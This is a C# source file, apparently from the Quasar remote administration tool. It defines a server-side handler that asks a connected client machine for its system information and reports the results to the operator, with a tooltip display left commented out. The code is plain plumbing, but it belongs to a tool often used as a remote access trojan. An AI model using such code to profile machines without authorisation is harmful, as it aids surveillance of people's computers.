using System;
using System.Collections.Generic;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Server.Networking;

namespace Quasar.Server.Messages
{
    public class SystemInformationHandler : MessageProcessorBase<List<Tuple<string, string>>>
    {
        /// <summary>
        /// The client which is associated with this system information handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// Initializes a new instance of the <see cref="SystemInformationHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public SystemInformationHandler(Client client) : base(true)
        {
            _client = client;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetSystemInfoResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender client) => _client.Equals(client);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetSystemInfoResponse info:
                    Execute(sender, info);
                    break;
            }
        }

        /// <summary>
        /// Refreshes the system information of the client.
        /// </summary>
        public void RefreshSystemInformation()
        {
            _client.Send(new GetSystemInfo());
        }

        private void Execute(ISender client, GetSystemInfoResponse message)
        {
            OnReport(message.SystemInfos);

            // TODO: Refactor tooltip
            //if (Settings.ShowToolTip)
            //{
            //    var builder = new StringBuilder();
            //    for (int i = 0; i < packet.SystemInfos.Length; i += 2)
            //    {
            //        if (packet.SystemInfos[i] != null && packet.SystemInfos[i + 1] != null)
            //        {
            //            builder.AppendFormat("{0}: {1}\r\n", packet.SystemInfos[i], packet.SystemInfos[i + 1]);
            //        }
            //    }

            //    FrmMain.Instance.SetToolTipText(client, builder.ToString());
            //}
        }

        protected override void Dispose(bool disposing)
        {
        }
    }
}
